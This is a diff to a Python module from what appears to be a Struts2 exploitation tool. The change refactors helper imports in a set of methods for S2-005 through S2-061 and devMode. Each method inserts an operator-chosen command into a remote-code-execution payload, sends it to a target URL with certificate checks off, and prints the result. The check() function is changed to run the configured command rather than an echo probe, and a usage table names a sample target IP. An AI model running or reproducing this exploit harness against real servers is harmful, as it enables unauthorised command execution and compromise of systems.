@@ -1,10 +1,9 @@
 import requests,http.client,base64
 from requests_toolbelt.utils import dump
 import urllib.parse
-from ClassCongregation import _urlparse
+from ClassCongregation import _urlparse,PocType_,verify
 from lxml import html
 from operator import methodcaller
-import CodeTest
 ################
 ##--ApacheStruts2--##
 #s2_005()
@@ -24,8 +23,9 @@ import CodeTest
 #s2_061()
 #s2_devMode()
 ################
-VULN = ''
-TIMEOUT = ''
+CMD = verify.CMD
+VULN = verify.VULN
+TIMEOUT = verify.TIMEOUT
 headers = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0',
     'Connection': 'close',
@@ -221,137 +221,137 @@ class ApacheStruts2():
         self.payload = self.payload_s2_005.replace("RECOMMAND",self.CMD)
         self.rawdata = "null"
         self.method = "post"
-        self.info = CodeTest.Colored_.rce()
+        self.info = PocType_.rce()
         try:
             self.request = requests.post(self.url, headers=headers, data=self.payload, timeout=TIMEOUT, verify=False)
             self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
-            CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
+            verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
-            CodeTest.verify.timeout_output(self.pocname)
+            verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
-            CodeTest.verify.connection_output(self.pocname)
+            verify.connection_output(self.pocname)
         except Exception as error:
-            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
             
     def s2_008(self):
         self.pocname = "Apache Struts2: S2-008"
         self.payload = self.payload_s2_008.replace("RECOMMAND", self.CMD)
         self.rawdata = "null"
         self.method = "get"
-        self.info = CodeTest.Colored_.rce()
+        self.info = PocType_.rce()
         try:
             self.request = requests.get(self.url+self.payload, headers=headers, timeout=TIMEOUT, verify=False)
             self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
-            CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
+            verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
-            CodeTest.verify.timeout_output(self.pocname)
+            verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
-            CodeTest.verify.connection_output(self.pocname)
+            verify.connection_output(self.pocname)
         except Exception as error:
-            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)          
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)          
 
     def s2_009(self):
         self.pocname = "Apache Struts2: S2-009"
         self.rawdata = "null"
         self.method = "post"
         self.payload = self.payload_s2_009.replace("RECOMMAND", self.CMD)
-        self.info = CodeTest.Colored_.rce()
+        self.info = PocType_.rce()
         try:
             self.request=requests.post(self.url, data=self.payload, headers=headers, timeout=TIMEOUT, verify=False)
             self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
-            CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
+            verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
-            CodeTest.verify.timeout_output(self.pocname)
+            verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
-            CodeTest.verify.connection_output(self.pocname)
+            verify.connection_output(self.pocname)
         except Exception as error:
-            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)    
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)    
 
     def s2_013(self):
         self.pocname = "Apache Struts2: S2-013"
         self.method = "get"
         self.rawdata = "null"
         self.payload = self.payload_s2_013.replace("RECOMMAND", self.CMD)
-        self.info = CodeTest.Colored_.rce()
+        self.info = PocType_.rce()
         try:
             self.request=requests.get(self.url+self.payload, headers=headers, timeout=TIMEOUT, verify=False)
             self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
-            CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
+            verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
-            CodeTest.verify.timeout_output(self.pocname)
+            verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
-            CodeTest.verify.connection_output(self.pocname)
+            verify.connection_output(self.pocname)
         except Exception as error:
-            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)  
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)  
 
     def s2_015(self):
         self.pocname = "Apache Struts2: S2-015"
         self.method = "get"
         self.payload = self.payload_s2_015.replace("RECOMMAND", self.CMD)
         self.rawdata = "null"
-        self.info = CodeTest.Colored_.rce()
+        self.info = PocType_.rce()
         try:
             self.request = requests.get(self.url+self.payload, headers=headers, timeout=TIMEOUT, verify=False)
             self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
-            CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
+            verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
-            CodeTest.verify.timeout_output(self.pocname)
+            verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
-            CodeTest.verify.connection_output(self.pocname)
+            verify.connection_output(self.pocname)
         except Exception as error:
-            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)  
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)  
 
     def s2_016(self):
         self.pocname = "Apache Struts2: S2-016"
         self.payload_1 = self.payload_s2_016_1.replace("RECOMMAND", self.CMD)
         self.payload_2 = self.payload_s2_016_2
         self.rawdata = "null"
-        self.info = CodeTest.Colored_.rce()
+        self.info = PocType_.rce()
         self.method = "get"
         try:
             self.request = requests.get(self.url+self.payload_1, headers=headers, timeout=TIMEOUT, verify=False)
             self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
-            CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
+            verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
-            CodeTest.verify.timeout_output(self.pocname)
+            verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
-            CodeTest.verify.connection_output(self.pocname)
+            verify.connection_output(self.pocname)
         except Exception as error:
-            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info) 
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info) 
 
     def s2_029(self):
         self.pocname = "Apache Struts2: S2-029"
         self.payload = self.payload_s2_029.replace("RECOMMAND", self.CMD)
         self.method = "get"
         self.rawdata = "null"
-        self.info = CodeTest.Colored_.rce()
+        self.info = PocType_.rce()
         try:
             self.request = requests.get(self.url+self.payload, headers=headers, timeout=TIMEOUT, verify=False)
             self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
-            CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
+            verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
-            CodeTest.verify.timeout_output(self.pocname)
+            verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
-            CodeTest.verify.connection_output(self.pocname)
+            verify.connection_output(self.pocname)
         except Exception as error:
-            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)  
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)  
 
     def s2_032(self):
         self.pocname = "Apache Struts2: S2-032"
         self.payload = self.payload_s2_032.replace("RECOMMAND",self.CMD)
         self.method = "get"
         self.rawdata = "null"
-        self.info = CodeTest.Colored_.rce()
+        self.info = PocType_.rce()
         try:
             self.request = requests.get(self.url+self.payload, headers=headers, timeout=TIMEOUT, verify=False)
             self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
-            CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
+            verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
-            CodeTest.verify.timeout_output(self.pocname)
+            verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
-            CodeTest.verify.connection_output(self.pocname)
+            verify.connection_output(self.pocname)
         except Exception as error:
-            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)  
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)  
 
     def s2_045(self):
         self.pocname = "Apache Struts2: S2-045"
@@ -368,7 +368,7 @@ class ApacheStruts2():
             'Content-Type': self.payload_s2_045.replace("RECOMMAND", self.CMD)
         }
         self.rawdata = "null"
-        self.info = CodeTest.Colored_.rce()
+        self.info = PocType_.rce()
         try:
             if VULN == 'False':
                 self.request = requests.get(self.url, headers=self.headers1, timeout=TIMEOUT, verify=False)
@@ -376,7 +376,7 @@ class ApacheStruts2():
                     vuln_number = 1
                     self.fuck045 = self.request.headers['FUCK']
                     self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
-                    CodeTest.verify.generic_output(self.fuck045, self.pocname, self.method, self.rawdata, self.info)
+                    verify.generic_output(self.fuck045, self.pocname, self.method, self.rawdata, self.info)
                 else:
                     try:
                         self.request = urllib.request.Request(self.url, headers=self.headers2)
@@ -386,18 +386,18 @@ class ApacheStruts2():
                     except Exception as error:
                         self.text045 = str(error)
                         if r"timed out" in self.text045:
-                            CodeTest.verify.timeout_output(self.pocname)
+                            verify.timeout_output(self.pocname)
                         elif r"Connection refused" in self.text045:
-                            CodeTest.verify.connection_output(self.pocname)
+                            verify.connection_output(self.pocname)
                         else:
-                            CodeTest.verify.generic_output(self.text045, self.pocname, self.method, self.rawdata, self.info)
+                            verify.generic_output(self.text045, self.pocname, self.method, self.rawdata, self.info)
                     try:
                         self.r = self.page.decode("utf-8")  
                     except:
                         self.r = self.page.decode("gbk")
                     else:
                         self.r = bytes.decode(self.page)
-                    CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
+                    verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
             else:
                 try:
                     self.request = urllib.request.Request(self.url, headers=self.headers2)
@@ -406,29 +406,29 @@ class ApacheStruts2():
                     self.page = error.partial
                     self.r = self.page.decode("utf-8")  
                     print (self.r)
-                    CodeTest.verify.generic_output(self.page, self.pocname, self.method, self.rawdata, self.info)
+                    verify.generic_output(self.page, self.pocname, self.method, self.rawdata, self.info)
                 except Exception as error:
                     self.text045 = str(error)
                     if r"timed out" in self.text045:
-                        CodeTest.verify.timeout_output(self.pocname)
+                        verify.timeout_output(self.pocname)
                     elif r"Connection refused" in self.text045:
-                        CodeTest.verify.connection_output(self.pocname)
+                        verify.connection_output(self.pocname)
                     else:
                         # print ("?")
-                        CodeTest.verify.generic_output(self.text045, self.pocname, self.method, self.rawdata, self.info)
+                        verify.generic_output(self.text045, self.pocname, self.method, self.rawdata, self.info)
                 try:
                     self.r = self.page.decode("utf-8")  
                 except:
                     self.r = self.page.decode("gbk")
                 else:
                     self.r = bytes.decode(self.page)
-                CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)                        
+                verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)                        
         except requests.exceptions.Timeout as error:
-            CodeTest.verify.timeout_output(self.pocname)
+            verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
-            CodeTest.verify.connection_output(self.pocname)
+            verify.connection_output(self.pocname)
         except Exception as error:
-            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info) 
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info) 
 
     def s2_046(self):
         self.pocname = "Apache Struts2: S2-046"
@@ -437,25 +437,25 @@ class ApacheStruts2():
             'Content-Type':'multipart/form-data; boundary=---------------------------'
         }
         self.rawdata = "null"
-        self.info = CodeTest.Colored_.rce()
+        self.info = PocType_.rce()
         self.method = "post"
         self.payload = self.payload_s2_046.replace("RECOMMAND",self.CMD)
         try:
             self.request = requests.post(self.url, data=self.payload, headers=self.headers, timeout=TIMEOUT, verify=False)
             self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
-            CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
+            verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
-            CodeTest.verify.timeout_output(self.pocname)
+            verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
-            CodeTest.verify.connection_output(self.pocname)
+            verify.connection_output(self.pocname)
         except Exception as error:
-            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info) 
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info) 
 
     def s2_048(self):
         self.pocname = "Apache Struts2: S2-048"
         self.method = "post"
         self.rawdata = "null"
-        self.info = CodeTest.Colored_.rce()
+        self.info = PocType_.rce()
         self.method = "post"
         if r"saveGangster.action" not in self.url:
             self.u = self.url+"/integration/saveGangster.action"
@@ -468,20 +468,20 @@ class ApacheStruts2():
         try:
             self.request = requests.post(self.u, data=self.data, headers=headers, timeout=TIMEOUT, verify=False)
             self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
-            CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
+            verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
-            CodeTest.verify.timeout_output(self.pocname)
+            verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
-            CodeTest.verify.connection_output(self.pocname)
+            verify.connection_output(self.pocname)
         except Exception as error:
-            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info) 
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info) 
 
     def s2_052(self):
         self.pocname = "Apache Struts2: S2-052"
         self.payload = self.payload_s2_052.replace("RECOMMAND",self.CMD)
         self.method = "post"
         self.rawdata = "null"
-        self.info = CodeTest.Colored_.rce()
+        self.info = PocType_.rce()
         self.headers = {
             'Accept': 'text/html, application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
             'User-agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
@@ -490,19 +490,19 @@ class ApacheStruts2():
         try:
             self.request = requests.post(self.url, data=self.payload, headers=self.headers, timeout=TIMEOUT, verify=False)
             self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
-            CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
+            verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
-            CodeTest.verify.timeout_output(self.pocname)
+            verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
-            CodeTest.verify.connection_output(self.pocname)
+            verify.connection_output(self.pocname)
         except Exception as error:
-            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info) 
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info) 
 
     def s2_057(self):
         self.pocname = "Apache Struts2: S2-057"
         self.method = "get"
         self.rawdata = "null"
-        self.info = CodeTest.Colored_.rce()
+        self.info = PocType_.rce()
         self.payload = self.payload_s2_057.replace("RECOMMAND",self.CMD)
         try:
             self.request = requests.get(self.url+self.payload, headers=headers, timeout=TIMEOUT, verify=False)
@@ -511,38 +511,38 @@ class ApacheStruts2():
             self.etree = html.etree
             self.page = self.etree.HTML(self.page)
             self.data = self.page.xpath('//footer/div[1]/p[1]/a[1]/@*')
-            CodeTest.verify.generic_output(self.data, self.pocname, self.method, self.rawdata, self.info)
+            verify.generic_output(self.data, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
-            CodeTest.verify.timeout_output(self.pocname)
+            verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
-            CodeTest.verify.connection_output(self.pocname)
+            verify.connection_output(self.pocname)
         except Exception as error:
-            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info) 
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info) 
 
     def s2_059(self):
         self.pocname = "Apache Struts2: S2-059"
         self.method = "post"
         self.rawdata = "null"
-        self.info = CodeTest.Colored_.rce()
+        self.info = PocType_.rce()
         self.payload = self.payload_s2_059.replace("RECOMMAND",self.CMD)
         if r"?" not in self.url:
             self.url = self.url + "?id="
         try:
             self.request = requests.post(self.url, data=self.payload, headers=headers, timeout=TIMEOUT, verify=False)
             self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
-            CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
+            verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
-            CodeTest.verify.timeout_output(self.pocname)
+            verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
-            CodeTest.verify.connection_output(self.pocname)
+            verify.connection_output(self.pocname)
         except Exception as error:
-            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
 
     def s2_061(self):
         self.pocname = "Apache Struts2: S2-061"
         self.method = "get"
         self.rawdata = "null"
-        self.info = CodeTest.Colored_.rce()
+        self.info = PocType_.rce()
         self.payload = self.payload_s2_061.replace("RECOMMAND",self.CMD)
         try:
             self.request = requests.get(self.url+self.payload, headers=headers, timeout=TIMEOUT, verify=False)
@@ -550,31 +550,31 @@ class ApacheStruts2():
             self.page = self.request.text
             self.page = etree.HTML(self.page)
             self.r = self.page.xpath('//a[@id]/@id')[0]
-            CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
+            verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
-            CodeTest.verify.timeout_output(self.pocname)
+            verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
-            CodeTest.verify.connection_output(self.pocname)
+            verify.connection_output(self.pocname)
         except Exception as error:
-            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
 
 
     def s2_devMode(self):
         self.pocname = "Apache Struts2: S2-devMode"
         self.method = "get"
         self.rawdata = "null"
-        self.info = CodeTest.Colored_.rce()
+        self.info = PocType_.rce()
         self.payload = self.payload_s2_devMode.replace("RECOMMAND",self.CMD)
         try:
             self.request = requests.get(self.url+self.payload, headers=headers, timeout=TIMEOUT, verify=False, allow_redirects=False)
             self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
-            CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
+            verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
-            CodeTest.verify.timeout_output(self.pocname)
+            verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
-            CodeTest.verify.connection_output(self.pocname)
+            verify.connection_output(self.pocname)
         except Exception as error:
-            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
 
 print("""eg: http://119.3.36.68:9001/
 +-------------------+------------------+-----+-----+-------------------------------------------------------------+
@@ -598,15 +598,7 @@ print("""eg: http://119.3.36.68:9001/
 | Apache Struts2    | s2_devMode       |  Y  |  Y  | 2.1.0 - 2.5.1, devmode remote code execution                |
 +-------------------+------------------+-----+-----+-------------------------------------------------------------+""")
 def check(**kwargs):
-    global VULN,TIMEOUT
-    VULN = kwargs['vuln']
-    TIMEOUT = int(kwargs['timeout'])
-    CodeTest.Verification.CMD = kwargs['cmd']
-    CodeTest.Verification.VULN = kwargs['vuln']
-    if VULN == 'False':
-        ExpApacheStruts2 = ApacheStruts2(kwargs['url'],"echo VuLnEcHoPoCSuCCeSS")
-    else:
-        ExpApacheStruts2 = ApacheStruts2(kwargs['url'],kwargs['cmd'])
+    ExpApacheStruts2 = ApacheStruts2(kwargs['url'],CMD)
     if kwargs['pocname'] != 'ALL':
         func = getattr(ExpApacheStruts2, kwargs['pocname'])#返回对象函数属性值，可以直接调用
         func()#调用函数
